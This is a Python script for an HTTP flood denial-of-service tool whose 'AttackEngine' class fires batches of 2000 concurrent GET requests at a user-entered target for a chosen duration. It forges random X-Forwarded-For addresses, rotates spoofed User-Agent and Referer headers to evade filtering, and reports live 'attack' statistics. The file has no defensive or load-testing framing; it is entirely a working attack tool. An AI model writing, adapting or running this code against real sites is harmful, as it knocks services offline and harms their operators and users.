import asyncio
import aiohttp
import random
import sys
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

REFERERS = [
    "https://www.google.com/", "https://www.facebook.com/", "https://www.youtube.com/",
    "https://www.reddit.com/", "https://www.instagram.com/", "https://www.linkedin.com/",
    "https://www.tiktok.com/", "https://www.twitter.com/", "https://news.ycombinator.com/"
]

MAX_CONCURRENT = 2000
REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=8)

class AttackEngine:
    def __init__(self, method, target, duration):
        self.method = method
        self.target = target
        self.time = duration
        self.start_time = 0
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }
        self.sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def make_request(self, session):
        async with self.sem:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
            }
            try:
                async with session.get(self.target, headers=headers) as resp:
                    if resp.status == 200:
                        return "SUCCESS"
                    elif str(resp.status).startswith("4"):
                        return "ERROR"
                    return "OTHER"
            except:
                return "ERROR"

    async def run(self):
        self.start_time = time.time()
        end_time = self.start_time + self.time

        connector = aiohttp.TCPConnector(limit=None, ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=REQUEST_TIMEOUT) as session:
            while time.time() < end_time:
                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                self.stats['total'] += len(results)
                self.stats['success'] += results.count("SUCCESS")
                self.stats['errors'] += results.count("ERROR")
                elapsed = time.time() - self.start_time
                rps = self.stats['total'] / elapsed if elapsed > 0 else 0
                self.stats['rps'] = rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)
                self.print_status()

    def print_status(self):
        elapsed = time.time() - self.start_time
        remain = max(0, self.time - elapsed)
        sys.stdout.write("\033[H\033[J")
        print(f"\nMETHOD: {self.method}")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" TIME LEFT: {remain:.1f}s")
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print("=" * 60)

    def print_summary(self):
        total_time = time.time() - self.start_time
        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" DURATION: {total_time:.1f}s")
        print(f" TOTAL REQUESTS: {self.stats['total']}")
        print(f" SUCCESS (200): {self.stats['success']}")
        print(f" ERRORS (4xx): {self.stats['errors']}")
        print(f" AVERAGE RPS: {avg_rps:.1f}")
        print("=" * 60)

def main():
    target = input("TARGET: ").strip()
    method = input("METHOD: ").strip().upper()
    duration = int(input("DURATION: ").strip())

    if not target.startswith(('http://', 'https://')):
        target = "http://" + target

    if method != "C-ECPLISE":
        print("Invalid method.")
        return

    engine = AttackEngine(method, target, duration)
    try:
        asyncio.run(engine.run())
        engine.print_summary()
    except KeyboardInterrupt:
        print("\nStopped.")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
